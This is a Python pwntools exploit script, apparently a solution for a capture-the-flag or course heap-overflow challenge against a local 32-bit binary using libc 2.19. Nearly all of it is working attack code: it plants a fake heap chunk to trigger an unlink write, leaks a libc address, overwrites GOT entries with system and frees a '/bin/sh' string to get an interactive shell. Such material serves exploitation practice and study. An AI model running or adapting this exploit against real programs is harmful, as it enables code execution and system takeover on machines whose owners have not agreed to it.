from pwn import *


def dbg(p, cmd=""):
    gdb.attach(p, cmd)
    pause()


if os.environ.get("ZELLIJ") == "0":
    context.terminal = [
        "zellij",
        "action",
        "new-pane",
        "-d",
        "right",
        "-c",
        "--",
        "bash",
        "-c",
    ]

p = process("heap-overflow_patched")


def choice(i):
    p.sendlineafter(b"option--->> ", str(i))


def add(title, type, content):
    choice(1)
    p.sendlineafter(b"title:", title)
    p.sendlineafter(b"type:", type)
    p.sendafter(b"content:", content)


def show(title):
    choice(3)
    p.sendlineafter(b"title:", title)


def edit(title, content):
    choice(4)
    p.sendlineafter(b"title:", title)
    p.sendafter(b"content:", content)


def delete(location):
    choice(5)
    p.sendafter(b"location:", location)


def get_location():
    p.recvuntil("location:")
    location = int(p.recvline()[:-1], 16)
    return location


context.log_level = "debug"

exe = ELF("./heap-overflow_patched")
# exe = ELF("/home/juicymio/code/swsec/heapoverflow/heap-overflow_patched")
libc = ELF("./libc-2.19.so")
# libc = ELF("/usr/lib32/libc.so.6")


def main():
    add("1", "1", "1")
    show("1")
    location = get_location()
    print(hex(location))
    # unlink
    fake_chunk = (
        p32(0x21)
        + p32(location + 0x170 + 0x6C + 4)  # self
        + p32(location + +0x170 + 8 - 8)  # target - 8
        + p32(0x804A440 - 0xC)  # expect value
        + p32(0) * 4
        + p32(0x21)
    )
    add("2", "2", fake_chunk)  # edit use strcpy, '\x00' Truncate
    delete(hex(location + 0x170 + 0x6C + 4)[2:])
    show(p32(0x804A34C) + b"\x00")
    p.recvuntil(p32(0x804A34C))
    p.recv(4)
    p.recv(4)
    libc.address = u32(p.recv(4)) - libc.sym["read"]
    print("libc:", hex(libc.address))

    add("3", "3", "3")
    add("4", "4", "4")
    edit("3", b"a" * 0x100 + b"bbbb" + b"cccc" + b"dddd" + p32(0x804A408 - 0xC))
    # size, self, fd, bk
    # dbg(p, "b *0x8048e4c")

    got = (
        b"aaaa"
        + b"aaaa"
        + b"aaaa"
        + b"aaaa"
        + p32(libc.sym["write"])
        + b"aaaa"
        + p32(libc.sym["system"])
        + p32(libc.sym["system"])
    )
    edit(p32(0x80483C4) + b"\x00", got)
    dbg(p)
    delete("/bin/sh\x00")

    p.interactive()


if __name__ == "__main__":
    main()
